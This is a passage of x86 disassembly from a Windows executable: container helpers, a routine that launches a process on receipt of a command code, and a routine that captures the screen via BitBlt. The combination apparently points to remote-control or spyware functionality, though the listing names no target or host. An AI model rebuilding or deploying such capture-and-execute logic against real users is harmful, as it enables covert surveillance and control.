  408ef8:	6a 0c                	push   $0xc
  408efa:	2b 45 08             	sub    0x8(%ebp),%eax
  408efd:	5b                   	pop    %ebx
  408efe:	99                   	cltd
  408eff:	f7 fb                	idiv   %ebx
  408f01:	3b c7                	cmp    %edi,%eax
  408f03:	73 48                	jae    0x408f4d
  408f05:	8b 45 08             	mov    0x8(%ebp),%eax
  408f08:	8d 1c 7f             	lea    (%edi,%edi,2),%ebx
  408f0b:	c1 e3 02             	shl    $0x2,%ebx
  408f0e:	8d 14 03             	lea    (%ebx,%eax,1),%edx
  408f11:	52                   	push   %edx
  408f12:	51                   	push   %ecx
  408f13:	50                   	push   %eax
  408f14:	8b ce                	mov    %esi,%ecx
  408f16:	e8 72 00 00 00       	call   0x408f8d
  408f1b:	8b 46 08             	mov    0x8(%esi),%eax
  408f1e:	ff 75 10             	push   0x10(%ebp)
  408f21:	2b 45 08             	sub    0x8(%ebp),%eax
  408f24:	6a 0c                	push   $0xc
  408f26:	99                   	cltd
  408f27:	59                   	pop    %ecx
  408f28:	f7 f9                	idiv   %ecx
  408f2a:	8b ce                	mov    %esi,%ecx
  408f2c:	2b f8                	sub    %eax,%edi
  408f2e:	57                   	push   %edi
  408f2f:	ff 76 08             	push   0x8(%esi)
  408f32:	e8 82 00 00 00       	call   0x408fb9
  408f37:	ff 75 10             	push   0x10(%ebp)
  408f3a:	ff 76 08             	push   0x8(%esi)
  408f3d:	ff 75 08             	push   0x8(%ebp)
  408f40:	e8 c3 00 00 00       	call   0x409008
  408f45:	83 c4 0c             	add    $0xc,%esp
  408f48:	01 5e 08             	add    %ebx,0x8(%esi)
  408f4b:	eb 39                	jmp    0x408f86
  408f4d:	85 ff                	test   %edi,%edi
  408f4f:	76 35                	jbe    0x408f86
  408f51:	8d 3c 7f             	lea    (%edi,%edi,2),%edi
  408f54:	51                   	push   %ecx
  408f55:	c1 e7 02             	shl    $0x2,%edi
  408f58:	51                   	push   %ecx
  408f59:	2b cf                	sub    %edi,%ecx
  408f5b:	51                   	push   %ecx
  408f5c:	8b ce                	mov    %esi,%ecx
  408f5e:	e8 2a 00 00 00       	call   0x408f8d
  408f63:	8b 46 08             	mov    0x8(%esi),%eax
  408f66:	8b 5d 08             	mov    0x8(%ebp),%ebx
  408f69:	50                   	push   %eax
  408f6a:	2b c7                	sub    %edi,%eax
  408f6c:	50                   	push   %eax
  408f6d:	53                   	push   %ebx
  408f6e:	e8 b6 00 00 00       	call   0x409029
  408f73:	ff 75 10             	push   0x10(%ebp)
  408f76:	8d 04 1f             	lea    (%edi,%ebx,1),%eax
  408f79:	50                   	push   %eax
  408f7a:	53                   	push   %ebx
  408f7b:	e8 88 00 00 00       	call   0x409008
  408f80:	83 c4 18             	add    $0x18,%esp
  408f83:	01 7e 08             	add    %edi,0x8(%esi)
  408f86:	5f                   	pop    %edi
  408f87:	5e                   	pop    %esi
  408f88:	5b                   	pop    %ebx
  408f89:	c9                   	leave
  408f8a:	c2 0c 00             	ret    $0xc
  408f8d:	55                   	push   %ebp
  408f8e:	8b ec                	mov    %esp,%ebp
  408f90:	56                   	push   %esi
  408f91:	8b 75 08             	mov    0x8(%ebp),%esi
  408f94:	57                   	push   %edi
  408f95:	8b f9                	mov    %ecx,%edi
  408f97:	3b 75 0c             	cmp    0xc(%ebp),%esi
  408f9a:	74 14                	je     0x408fb0
  408f9c:	56                   	push   %esi
  408f9d:	8b cf                	mov    %edi,%ecx
  408f9f:	ff 75 10             	push   0x10(%ebp)
  408fa2:	e8 4d 00 00 00       	call   0x408ff4
  408fa7:	83 45 10 0c          	addl   $0xc,0x10(%ebp)
  408fab:	83 c6 0c             	add    $0xc,%esi
  408fae:	eb e7                	jmp    0x408f97
  408fb0:	8b 45 10             	mov    0x10(%ebp),%eax
  408fb3:	5f                   	pop    %edi
  408fb4:	5e                   	pop    %esi
  408fb5:	5d                   	pop    %ebp
  408fb6:	c2 0c 00             	ret    $0xc
  408fb9:	55                   	push   %ebp
  408fba:	8b ec                	mov    %esp,%ebp
  408fbc:	56                   	push   %esi
  408fbd:	8b 75 0c             	mov    0xc(%ebp),%esi
  408fc0:	57                   	push   %edi
  408fc1:	8b f9                	mov    %ecx,%edi
  408fc3:	85 f6                	test   %esi,%esi
  408fc5:	76 14                	jbe    0x408fdb
  408fc7:	ff 75 10             	push   0x10(%ebp)
  408fca:	8b cf                	mov    %edi,%ecx
  408fcc:	ff 75 08             	push   0x8(%ebp)
  408fcf:	e8 20 00 00 00       	call   0x408ff4
  408fd4:	83 45 08 0c          	addl   $0xc,0x8(%ebp)
  408fd8:	4e                   	dec    %esi
  408fd9:	75 ec                	jne    0x408fc7
  408fdb:	5f                   	pop    %edi
  408fdc:	5e                   	pop    %esi
  408fdd:	5d                   	pop    %ebp
  408fde:	c2 0c 00             	ret    $0xc
  408fe1:	55                   	push   %ebp
  408fe2:	8b ec                	mov    %esp,%ebp
  408fe4:	6a 00                	push   $0x0
  408fe6:	ff 75 08             	push   0x8(%ebp)
  408fe9:	e8 63 00 00 00       	call   0x409051
  408fee:	59                   	pop    %ecx
  408fef:	59                   	pop    %ecx
  408ff0:	5d                   	pop    %ebp
  408ff1:	c2 08 00             	ret    $0x8
  408ff4:	55                   	push   %ebp
  408ff5:	8b ec                	mov    %esp,%ebp
  408ff7:	ff 75 0c             	push   0xc(%ebp)
  408ffa:	ff 75 08             	push   0x8(%ebp)
  408ffd:	e8 6a 00 00 00       	call   0x40906c
  409002:	59                   	pop    %ecx
  409003:	59                   	pop    %ecx
  409004:	5d                   	pop    %ebp
  409005:	c2 08 00             	ret    $0x8
  409008:	55                   	push   %ebp
  409009:	8b ec                	mov    %esp,%ebp
  40900b:	8b 45 08             	mov    0x8(%ebp),%eax
  40900e:	3b 45 0c             	cmp    0xc(%ebp),%eax
  409011:	74 14                	je     0x409027
  409013:	56                   	push   %esi
  409014:	57                   	push   %edi
  409015:	8b 75 10             	mov    0x10(%ebp),%esi
  409018:	8b f8                	mov    %eax,%edi
  40901a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40901b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40901c:	83 c0 0c             	add    $0xc,%eax
  40901f:	3b 45 0c             	cmp    0xc(%ebp),%eax
  409022:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409023:	75 f0                	jne    0x409015
  409025:	5f                   	pop    %edi
  409026:	5e                   	pop    %esi
  409027:	5d                   	pop    %ebp
  409028:	c3                   	ret
  409029:	55                   	push   %ebp
  40902a:	8b ec                	mov    %esp,%ebp
  40902c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40902f:	39 45 08             	cmp    %eax,0x8(%ebp)
  409032:	74 18                	je     0x40904c
  409034:	56                   	push   %esi
  409035:	57                   	push   %edi
  409036:	83 6d 10 0c          	subl   $0xc,0x10(%ebp)
  40903a:	83 e8 0c             	sub    $0xc,%eax
  40903d:	8b 7d 10             	mov    0x10(%ebp),%edi
  409040:	8b f0                	mov    %eax,%esi
  409042:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409043:	3b 45 08             	cmp    0x8(%ebp),%eax
  409046:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409047:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409048:	75 ec                	jne    0x409036
  40904a:	5f                   	pop    %edi
  40904b:	5e                   	pop    %esi
  40904c:	8b 45 10             	mov    0x10(%ebp),%eax
  40904f:	5d                   	pop    %ebp
  409050:	c3                   	ret
  409051:	55                   	push   %ebp
  409052:	8b ec                	mov    %esp,%ebp
  409054:	8b 45 08             	mov    0x8(%ebp),%eax
  409057:	85 c0                	test   %eax,%eax
  409059:	7d 02                	jge    0x40905d
  40905b:	33 c0                	xor    %eax,%eax
  40905d:	8d 04 40             	lea    (%eax,%eax,2),%eax
  409060:	c1 e0 02             	shl    $0x2,%eax
  409063:	50                   	push   %eax
  409064:	e8 c7 33 00 00       	call   0x40c430
  409069:	59                   	pop    %ecx
  40906a:	5d                   	pop    %ebp
  40906b:	c3                   	ret
  40906c:	55                   	push   %ebp
  40906d:	8b ec                	mov    %esp,%ebp
  40906f:	ff 75 08             	push   0x8(%ebp)
  409072:	6a 0c                	push   $0xc
  409074:	e8 2f ca ff ff       	call   0x405aa8
  409079:	59                   	pop    %ecx
  40907a:	85 c0                	test   %eax,%eax
  40907c:	59                   	pop    %ecx
  40907d:	74 0c                	je     0x40908b
  40907f:	56                   	push   %esi
  409080:	8b 75 0c             	mov    0xc(%ebp),%esi
  409083:	57                   	push   %edi
  409084:	8b f8                	mov    %eax,%edi
  409086:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409087:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409088:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409089:	5f                   	pop    %edi
  40908a:	5e                   	pop    %esi
  40908b:	5d                   	pop    %ebp
  40908c:	c3                   	ret
  40908d:	e8 05 00 00 00       	call   0x409097
  409092:	e9 0d 00 00 00       	jmp    0x4090a4
  409097:	6a 00                	push   $0x0
  409099:	b9 b8 1b 41 00       	mov    $0x411bb8,%ecx
  40909e:	e8 d5 7f ff ff       	call   0x401078
  4090a3:	c3                   	ret
  4090a4:	68 b0 90 40 00       	push   $0x4090b0
  4090a9:	e8 0a 33 00 00       	call   0x40c3b8
  4090ae:	59                   	pop    %ecx
  4090af:	c3                   	ret
  4090b0:	b9 b8 1b 41 00       	mov    $0x411bb8,%ecx
  4090b5:	e9 b1 80 ff ff       	jmp    0x40116b
  4090ba:	55                   	push   %ebp
  4090bb:	8b ec                	mov    %esp,%ebp
  4090bd:	53                   	push   %ebx
  4090be:	bb b8 1b 41 00       	mov    $0x411bb8,%ebx
  4090c3:	56                   	push   %esi
  4090c4:	57                   	push   %edi
  4090c5:	8b cb                	mov    %ebx,%ecx
  4090c7:	e8 d4 7f ff ff       	call   0x4010a0
  4090cc:	83 ec 10             	sub    $0x10,%esp
  4090cf:	be 78 11 41 00       	mov    $0x411178,%esi
  4090d4:	8b fc                	mov    %esp,%edi
  4090d6:	8b cb                	mov    %ebx,%ecx
  4090d8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4090d9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4090da:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4090db:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4090dc:	e8 22 80 ff ff       	call   0x401103
  4090e1:	83 ec 10             	sub    $0x10,%esp
  4090e4:	8d 45 08             	lea    0x8(%ebp),%eax
  4090e7:	8b cc                	mov    %esp,%ecx
  4090e9:	50                   	push   %eax
  4090ea:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4090f0:	6a 2e                	push   $0x2e
  4090f2:	8b cb                	mov    %ebx,%ecx
  4090f4:	e8 31 80 ff ff       	call   0x40112a
  4090f9:	6a 01                	push   $0x1
  4090fb:	68 b3 92 40 00       	push   $0x4092b3
  409100:	8b cb                	mov    %ebx,%ecx
  409102:	e8 aa 80 ff ff       	call   0x4011b1
  409107:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40910a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409110:	5f                   	pop    %edi
  409111:	5e                   	pop    %esi
  409112:	5b                   	pop    %ebx
  409113:	5d                   	pop    %ebp
  409114:	c3                   	ret
  409115:	55                   	push   %ebp
  409116:	8b ec                	mov    %esp,%ebp
  409118:	81 ec fc 00 00 00    	sub    $0xfc,%esp
  40911e:	56                   	push   %esi
  40911f:	8d 45 08             	lea    0x8(%ebp),%eax
  409122:	57                   	push   %edi
  409123:	50                   	push   %eax
  409124:	8d 45 fe             	lea    -0x2(%ebp),%eax
  409127:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40912a:	50                   	push   %eax
  40912b:	68 cc d5 40 00       	push   $0x40d5cc
  409130:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  409136:	50                   	push   %eax
  409137:	68 e8 dd 40 00       	push   $0x40dde8
  40913c:	ff 15 64 d3 40 00    	call   *0x40d364
  409142:	59                   	pop    %ecx
  409143:	50                   	push   %eax
  409144:	8d 45 a0             	lea    -0x60(%ebp),%eax
  409147:	50                   	push   %eax
  409148:	e8 77 35 00 00       	call   0x40c6c4
  40914d:	83 c4 0c             	add    $0xc,%esp
  409150:	50                   	push   %eax
  409151:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409154:	50                   	push   %eax
  409155:	e8 5e 35 00 00       	call   0x40c6b8
  40915a:	83 c4 0c             	add    $0xc,%esp
  40915d:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  409160:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409166:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  409169:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40916f:	6a 01                	push   $0x1
  409171:	6a 10                	push   $0x10
  409173:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409176:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40917c:	50                   	push   %eax
  40917d:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  409183:	ff 15 c4 d1 40 00    	call   *0x40d1c4
  409189:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40918f:	ff 15 d4 d1 40 00    	call   *0x40d1d4
  409195:	84 c0                	test   %al,%al
  409197:	0f 84 cb 00 00 00    	je     0x409268
  40919d:	8d 45 18             	lea    0x18(%ebp),%eax
  4091a0:	50                   	push   %eax
  4091a1:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  4091a7:	50                   	push   %eax
  4091a8:	e8 35 35 00 00       	call   0x40c6e2
  4091ad:	59                   	pop    %ecx
  4091ae:	59                   	pop    %ecx
  4091af:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  4091b5:	ff 15 bc d1 40 00    	call   *0x40d1bc
  4091bb:	33 f6                	xor    %esi,%esi
  4091bd:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4091c0:	c7 45 b0 3c 00 00 00 	movl   $0x3c,-0x50(%ebp)
  4091c7:	c7 45 b4 40 00 00 00 	movl   $0x40,-0x4c(%ebp)
  4091ce:	89 75 b8             	mov    %esi,-0x48(%ebp)
  4091d1:	89 75 bc             	mov    %esi,-0x44(%ebp)
  4091d4:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4091da:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4091dd:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4091e0:	50                   	push   %eax
  4091e1:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4091e4:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4091e7:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  4091ee:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4091f1:	ff 15 98 d3 40 00    	call   *0x40d398
  4091f7:	85 c0                	test   %eax,%eax
  4091f9:	0f 95 45 fe          	setne  -0x2(%ebp)
  4091fd:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  409200:	bf b8 1b 41 00       	mov    $0x411bb8,%edi
  409205:	74 41                	je     0x409248
  409207:	83 ec 10             	sub    $0x10,%esp
  40920a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40920d:	8b cc                	mov    %esp,%ecx
  40920f:	50                   	push   %eax
  409210:	68 a0 d4 40 00       	push   $0x40d4a0
  409215:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40921b:	6a 70                	push   $0x70
  40921d:	8b cf                	mov    %edi,%ecx
  40921f:	e8 06 7f ff ff       	call   0x40112a
  409224:	6a ff                	push   $0xffffffff
  409226:	ff 75 e8             	push   -0x18(%ebp)
  409229:	ff 15 a0 d1 40 00    	call   *0x40d1a0
  40922f:	ff 75 e8             	push   -0x18(%ebp)
  409232:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  409238:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40923b:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  409241:	50                   	push   %eax
  409242:	ff 15 d4 d0 40 00    	call   *0x40d0d4
  409248:	80 7d fe 01          	cmpb   $0x1,-0x2(%ebp)
  40924c:	75 3a                	jne    0x409288
  40924e:	83 ec 10             	sub    $0x10,%esp
  409251:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409254:	8b cc                	mov    %esp,%ecx
  409256:	50                   	push   %eax
  409257:	68 a0 d4 40 00       	push   $0x40d4a0
  40925c:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  409262:	6a 6e                	push   $0x6e
  409264:	8b cf                	mov    %edi,%ecx
  409266:	eb 1b                	jmp    0x409283
  409268:	83 ec 10             	sub    $0x10,%esp
  40926b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40926e:	8b cc                	mov    %esp,%ecx
  409270:	50                   	push   %eax
  409271:	68 a0 d4 40 00       	push   $0x40d4a0
  409276:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40927c:	6a 6f                	push   $0x6f
  40927e:	b9 b8 1b 41 00       	mov    $0x411bb8,%ecx
  409283:	e8 a2 7e ff ff       	call   0x40112a
  409288:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40928e:	ff 15 b8 d1 40 00    	call   *0x40d1b8
  409294:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  409297:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40929d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4092a0:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4092a6:	8d 4d 18             	lea    0x18(%ebp),%ecx
  4092a9:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4092af:	5f                   	pop    %edi
  4092b0:	5e                   	pop    %esi
  4092b1:	c9                   	leave
  4092b2:	c3                   	ret
  4092b3:	55                   	push   %ebp
  4092b4:	8b ec                	mov    %esp,%ebp
  4092b6:	83 ec 30             	sub    $0x30,%esp
  4092b9:	56                   	push   %esi
  4092ba:	8b 75 08             	mov    0x8(%ebp),%esi
  4092bd:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4092c0:	8d 46 18             	lea    0x18(%esi),%eax
  4092c3:	50                   	push   %eax
  4092c4:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4092ca:	ff 76 28             	push   0x28(%esi)
  4092cd:	ff 15 88 d1 40 00    	call   *0x40d188
  4092d3:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4092d6:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4092dc:	8b 30                	mov    (%eax),%esi
  4092de:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  4092e3:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4092e6:	ff 30                	push   (%eax)
  4092e8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4092eb:	6a 04                	push   $0x4
  4092ed:	50                   	push   %eax
  4092ee:	ff 15 cc d2 40 00    	call   *0x40d2cc
  4092f4:	83 ec 10             	sub    $0x10,%esp
  4092f7:	8b cc                	mov    %esp,%ecx
  4092f9:	68 68 11 41 00       	push   $0x411168
  4092fe:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  409304:	83 ec 10             	sub    $0x10,%esp
  409307:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40930a:	8b cc                	mov    %esp,%ecx
  40930c:	50                   	push   %eax
  40930d:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  409313:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409316:	50                   	push   %eax
  409317:	e8 d1 20 00 00       	call   0x40b3ed
  40931c:	83 c4 24             	add    $0x24,%esp
  40931f:	83 fe 45             	cmp    $0x45,%esi
  409322:	75 34                	jne    0x409358
  409324:	6a 01                	push   $0x1
  409326:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409329:	e8 31 88 ff ff       	call   0x401b5f
  40932e:	83 ec 10             	sub    $0x10,%esp
  409331:	8b cc                	mov    %esp,%ecx
  409333:	50                   	push   %eax
  409334:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40933a:	6a 00                	push   $0x0
  40933c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40933f:	e8 1b 88 ff ff       	call   0x401b5f
  409344:	83 ec 10             	sub    $0x10,%esp
  409347:	8b cc                	mov    %esp,%ecx
  409349:	50                   	push   %eax
  40934a:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  409350:	e8 c0 fd ff ff       	call   0x409115
  409355:	83 c4 20             	add    $0x20,%esp
  409358:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40935b:	e8 d0 87 ff ff       	call   0x401b30
  409360:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  409363:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409369:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40936c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  409372:	33 c0                	xor    %eax,%eax
  409374:	5e                   	pop    %esi
  409375:	c9                   	leave
  409376:	c2 04 00             	ret    $0x4
  409379:	e8 05 00 00 00       	call   0x409383
  40937e:	e9 0b 00 00 00       	jmp    0x40938e
  409383:	b9 55 1c 41 00       	mov    $0x411c55,%ecx
  409388:	ff 25 d8 d1 40 00    	jmp    *0x40d1d8
  40938e:	68 9a 93 40 00       	push   $0x40939a
  409393:	e8 20 30 00 00       	call   0x40c3b8
  409398:	59                   	pop    %ecx
  409399:	c3                   	ret
  40939a:	b9 55 1c 41 00       	mov    $0x411c55,%ecx
  40939f:	ff 25 dc d1 40 00    	jmp    *0x40d1dc
  4093a5:	e8 05 00 00 00       	call   0x4093af
  4093aa:	e9 0b 00 00 00       	jmp    0x4093ba
  4093af:	b9 54 1c 41 00       	mov    $0x411c54,%ecx
  4093b4:	ff 25 e0 d1 40 00    	jmp    *0x40d1e0
  4093ba:	68 c6 93 40 00       	push   $0x4093c6
  4093bf:	e8 f4 2f 00 00       	call   0x40c3b8
  4093c4:	59                   	pop    %ecx
  4093c5:	c3                   	ret
  4093c6:	b9 54 1c 41 00       	mov    $0x411c54,%ecx
  4093cb:	ff 25 e4 d1 40 00    	jmp    *0x40d1e4
  4093d1:	e8 05 00 00 00       	call   0x4093db
  4093d6:	e9 0d 00 00 00       	jmp    0x4093e8
  4093db:	6a 00                	push   $0x0
  4093dd:	b9 10 1c 41 00       	mov    $0x411c10,%ecx
  4093e2:	e8 91 7c ff ff       	call   0x401078
  4093e7:	c3                   	ret
  4093e8:	68 f4 93 40 00       	push   $0x4093f4
  4093ed:	e8 c6 2f 00 00       	call   0x40c3b8
  4093f2:	59                   	pop    %ecx
  4093f3:	c3                   	ret
  4093f4:	b9 10 1c 41 00       	mov    $0x411c10,%ecx
  4093f9:	e9 6d 7d ff ff       	jmp    0x40116b
  4093fe:	e8 05 00 00 00       	call   0x409408
  409403:	e9 0d 00 00 00       	jmp    0x409415
  409408:	6a 00                	push   $0x0
  40940a:	b9 58 1c 41 00       	mov    $0x411c58,%ecx
  40940f:	e8 64 7c ff ff       	call   0x401078
  409414:	c3                   	ret
  409415:	68 21 94 40 00       	push   $0x409421
  40941a:	e8 99 2f 00 00       	call   0x40c3b8
  40941f:	59                   	pop    %ecx
  409420:	c3                   	ret
  409421:	b9 58 1c 41 00       	mov    $0x411c58,%ecx
  409426:	e9 40 7d ff ff       	jmp    0x40116b
  40942b:	e9 00 00 00 00       	jmp    0x409430
  409430:	68 fc dd 40 00       	push   $0x40ddfc
  409435:	68 f0 dd 40 00       	push   $0x40ddf0
  40943a:	ff 15 0c d1 40 00    	call   *0x40d10c
  409440:	50                   	push   %eax
  409441:	ff 15 28 d1 40 00    	call   *0x40d128
  409447:	a3 08 1c 41 00       	mov    %eax,0x411c08
  40944c:	c3                   	ret
  40944d:	e8 05 00 00 00       	call   0x409457
  409452:	e9 15 00 00 00       	jmp    0x40946c
  409457:	55                   	push   %ebp
  409458:	8b ec                	mov    %esp,%ebp
  40945a:	51                   	push   %ecx
  40945b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40945e:	b9 a0 1c 41 00       	mov    $0x411ca0,%ecx
  409463:	50                   	push   %eax
  409464:	ff 15 20 d2 40 00    	call   *0x40d220
  40946a:	c9                   	leave
  40946b:	c3                   	ret
  40946c:	68 78 94 40 00       	push   $0x409478
  409471:	e8 42 2f 00 00       	call   0x40c3b8
  409476:	59                   	pop    %ecx
  409477:	c3                   	ret
  409478:	b9 a0 1c 41 00       	mov    $0x411ca0,%ecx
  40947d:	ff 25 9c d2 40 00    	jmp    *0x40d29c
  409483:	e8 05 00 00 00       	call   0x40948d
  409488:	e9 15 00 00 00       	jmp    0x4094a2
  40948d:	55                   	push   %ebp
  40948e:	8b ec                	mov    %esp,%ebp
  409490:	51                   	push   %ecx
  409491:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409494:	b9 b0 1c 41 00       	mov    $0x411cb0,%ecx
  409499:	50                   	push   %eax
  40949a:	ff 15 dc d2 40 00    	call   *0x40d2dc
  4094a0:	c9                   	leave
  4094a1:	c3                   	ret
  4094a2:	68 ae 94 40 00       	push   $0x4094ae
  4094a7:	e8 0c 2f 00 00       	call   0x40c3b8
  4094ac:	59                   	pop    %ecx
  4094ad:	c3                   	ret
  4094ae:	b9 b0 1c 41 00       	mov    $0x411cb0,%ecx
  4094b3:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  4094b9:	55                   	push   %ebp
  4094ba:	8b ec                	mov    %esp,%ebp
  4094bc:	81 ec 80 00 00 00    	sub    $0x80,%esp
  4094c2:	53                   	push   %ebx
  4094c3:	56                   	push   %esi
  4094c4:	33 db                	xor    %ebx,%ebx
  4094c6:	57                   	push   %edi
  4094c7:	53                   	push   %ebx
  4094c8:	53                   	push   %ebx
  4094c9:	53                   	push   %ebx
  4094ca:	68 0c de 40 00       	push   $0x40de0c
  4094cf:	ff 15 a0 d0 40 00    	call   *0x40d0a0
  4094d5:	8b f8                	mov    %eax,%edi
  4094d7:	57                   	push   %edi
  4094d8:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4094db:	ff 15 9c d0 40 00    	call   *0x40d09c
  4094e1:	8b 35 98 d0 40 00    	mov    0x40d098,%esi
  4094e7:	6a 08                	push   $0x8
  4094e9:	57                   	push   %edi
  4094ea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4094ed:	ff d6                	call   *%esi
  4094ef:	6a 0a                	push   $0xa
  4094f1:	57                   	push   %edi
  4094f2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4094f5:	ff d6                	call   *%esi
  4094f7:	8b f0                	mov    %eax,%esi
  4094f9:	56                   	push   %esi
  4094fa:	ff 75 f0             	push   -0x10(%ebp)
  4094fd:	57                   	push   %edi
  4094fe:	ff 15 94 d0 40 00    	call   *0x40d094
  409504:	3b c3                	cmp    %ebx,%eax
  409506:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409509:	75 1d                	jne    0x409528
  40950b:	8b 35 90 d0 40 00    	mov    0x40d090,%esi
  409511:	57                   	push   %edi
  409512:	ff d6                	call   *%esi
  409514:	ff 75 fc             	push   -0x4(%ebp)
  409517:	ff d6                	call   *%esi
  409519:	53                   	push   %ebx
  40951a:	ff 15 8c d0 40 00    	call   *0x40d08c
  409520:	8d 45 0f             	lea    0xf(%ebp),%eax
  409523:	e9 10 02 00 00       	jmp    0x409738
  409528:	50                   	push   %eax
  409529:	ff 75 fc             	push   -0x4(%ebp)
  40952c:	ff 15 88 d0 40 00    	call   *0x40d088
  409532:	85 c0                	test   %eax,%eax
  409534:	75 1f                	jne    0x409555
  409536:	57                   	push   %edi
  409537:	8b 3d 90 d0 40 00    	mov    0x40d090,%edi
  40953d:	ff d7                	call   *%edi
  40953f:	ff 75 fc             	push   -0x4(%ebp)
  409542:	ff d7                	call   *%edi
  409544:	ff 75 f8             	push   -0x8(%ebp)
  409547:	ff 15 8c d0 40 00    	call   *0x40d08c
  40954d:	8d 45 0f             	lea    0xf(%ebp),%eax
  409550:	e9 e3 01 00 00       	jmp    0x409738
  409555:	68 20 00 cc 00       	push   $0xcc0020
  40955a:	56                   	push   %esi
  40955b:	ff 75 f0             	push   -0x10(%ebp)
  40955e:	53                   	push   %ebx
  40955f:	53                   	push   %ebx
  409560:	57                   	push   %edi
  409561:	56                   	push   %esi
  409562:	ff 75 f0             	push   -0x10(%ebp)
  409565:	53                   	push   %ebx
  409566:	53                   	push   %ebx
  409567:	ff 75 fc             	push   -0x4(%ebp)
  40956a:	ff 15 84 d0 40 00    	call   *0x40d084
  409570:	85 c0                	test   %eax,%eax
  409572:	75 1f                	jne    0x409593
  409574:	57                   	push   %edi
  409575:	8b 3d 90 d0 40 00    	mov    0x40d090,%edi
  40957b:	ff d7                	call   *%edi
  40957d:	ff 75 fc             	push   -0x4(%ebp)
  409580:	ff d7                	call   *%edi
  409582:	ff 75 f8             	push   -0x8(%ebp)
  409585:	ff 15 8c d0 40 00    	call   *0x40d08c
  40958b:	8d 45 0f             	lea    0xf(%ebp),%eax
  40958e:	e9 a5 01 00 00       	jmp    0x409738
  409593:	38 5d 0c             	cmp    %bl,0xc(%ebp)
  409596:	8b 3d 8c d0 40 00    	mov    0x40d08c,%edi
  40959c:	74 4a                	je     0x4095e8
  40959e:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4095a1:	c7 45 ac 14 00 00 00 	movl   $0x14,-0x54(%ebp)
  4095a8:	50                   	push   %eax
  4095a9:	ff 15 08 1c 41 00    	call   *0x411c08
  4095af:	85 c0                	test   %eax,%eax
  4095b1:	74 35                	je     0x4095e8
  4095b3:	8d 45 98             	lea    -0x68(%ebp),%eax
  4095b6:	50                   	push   %eax
  4095b7:	ff 75 b4             	push   -0x4c(%ebp)
